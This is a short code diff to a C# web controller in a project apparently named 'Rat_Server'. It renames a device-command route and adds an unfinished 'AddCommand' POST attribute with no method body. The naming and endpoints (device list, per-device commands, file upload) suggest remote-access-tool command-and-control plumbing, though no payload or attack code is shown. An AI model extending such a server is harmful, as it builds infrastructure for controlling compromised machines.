@@ -34,7 +34,7 @@ namespace Rat_Server.Controllers
             return Ok(await _context.Devices.ToListAsync());
         }
 
-        [HttpGet("GetDeviceCommands/{deviceId}")]
+        [HttpGet("GetCommands/{deviceId}")]
         public async Task<ActionResult<List<Command>>> GetDeviceCommands(Guid deviceId)
         {
             if (await _context.Devices.FindAsync(deviceId) == null)
@@ -141,5 +141,7 @@ namespace Rat_Server.Controllers
             // Return 204 No Content to indicate to the client the file was successfully added
             return NoContent();
         }
+
+        [HttpPost("AddCommand")]
     }
 }
